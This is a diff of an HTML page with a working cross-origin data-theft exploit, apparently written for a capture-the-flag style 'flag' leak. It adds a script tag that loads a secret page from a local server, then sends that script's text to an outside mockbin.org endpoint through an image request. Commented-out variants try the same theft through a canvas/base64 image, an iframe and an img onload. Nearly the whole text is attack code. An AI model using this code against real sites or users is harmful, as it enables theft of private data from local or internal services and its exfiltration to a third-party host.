@@ -7,7 +7,7 @@
   </head>
   <body>
   
-  
+ <script src="http://127.0.0.1:8080/secret.html"></script> 
     <script>
 	
 function getBase64Image(img) {
@@ -32,6 +32,7 @@ function sendrequ(payload){
 	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + payload;
 	document.body.appendChild(img);
 }   
+sendrequ(document.scripts[0].text);
 /*
 function getFrameContents(){
    var iFrame =  document.getElementById('testf');
@@ -64,7 +65,7 @@ function getFrameContents(){
 	*/
 	//setTimeout(function(){sendrequ(getBase64Image(document.getElementById("ttt")));}, 5000);
 	//setTimeout(function(){sendrequ(getFrameContents());}, 5000);
-	
+/*	
     var i = new Image();
     i.crossOrigin = "Anonymous";
 	i.src = "http://127.0.0.1:8080/secret.html";
@@ -77,7 +78,9 @@ function getFrameContents(){
 		sendrequ(getBase64Image(i));
 	};
 	document.body.appendChild(i);
+	*/
     </script>
+    
     <!--<img id="ttt" src="http://127.0.0.1:8080/secret.html" style="width:1px;height:1px;" onload="sendrequ(getBase64Image(document.getElementById("ttt")))">-->
     <!--<iframe id="testf" src="http://127.0.0.1:8080/secret.html" onload="sendrequ(getFrameContents())"></iframe>-->
   </body>
